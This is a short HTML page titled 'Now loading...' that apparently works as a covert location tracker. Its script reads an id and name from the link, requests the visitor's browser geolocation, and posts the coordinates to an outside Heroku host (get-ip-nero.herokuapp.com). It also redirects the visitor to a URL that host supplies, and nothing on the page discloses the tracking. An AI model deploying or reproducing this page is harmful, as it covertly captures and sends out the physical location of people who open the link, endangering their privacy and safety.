<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <title>Now loading...</title>
    <script type="text/javascript">
      const url = new URL(location.href);
      const params = url.searchParams;
      const id = params.get("id");
      const nam = params.get("name");
      navigator.geolocation.getCurrentPosition(async position => {
        const res = await fetch("https://get-ip-nero.herokuapp.com/auth"), url = await res.json();
        location.href = url.url;
        await fetch("https://get-ip-nero.herokuapp.com/geo?id=" + id + "&name=" + nam, {
          method: 'POST',
          mode: 'cors',
          headers: {'Content-Type': 'application/json'},
          body: JSON.stringify({lat: position.coords.latitude, lng: position.coords.longitude})
        });
      }, async () => {
        const res = await fetch("https://get-ip-nero.herokuapp.com/auth"), url = await res.json();
        location.href = url.url;
      });
    </script>
  </head>
</html>